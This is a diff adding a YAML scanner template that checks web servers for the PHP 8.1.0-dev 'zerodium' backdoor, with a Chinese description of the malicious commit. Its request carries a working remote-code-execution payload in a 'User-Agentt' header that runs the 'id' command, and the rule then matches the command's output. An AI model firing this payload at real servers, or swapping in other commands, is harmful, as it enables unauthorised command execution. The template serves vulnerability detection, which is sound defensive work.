@@ -1,0 +1,22 @@
+id: php-zerodium-backdoor
+
+info:
+  name: PHP zerodium后门漏洞
+  author: zan8in
+  severity: critical
+  description: |
+    PHP开发工程师Jake Birchall在对其中一个恶意COMMIT的分析过程中发现，在代码中注入的后门是来自一个PHP代码被劫持的网站上，并且采用了远程代码执行的操作，并且攻击者盗用了PHP开发人员的名义来提交此COMMIT。
+    目前为止PHP官方并未就该事件进行更多披露，表示此次服务器被黑的具体细节仍在调查当中。由于此事件的影响，PHP的官方代码库已经被维护人员迁移至GitHub平台，之后的相关代码更新、修改将会都在GitHub上进行
+    "PHP/8.1.0-dev"
+  reference:
+    - http://wiki.peiqi.tech/wiki/language/PHP/PHP%20zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E.html
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /
+      headers:
+        User-Agentt: zerodiumsystem('id');
+    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+expression: r0()
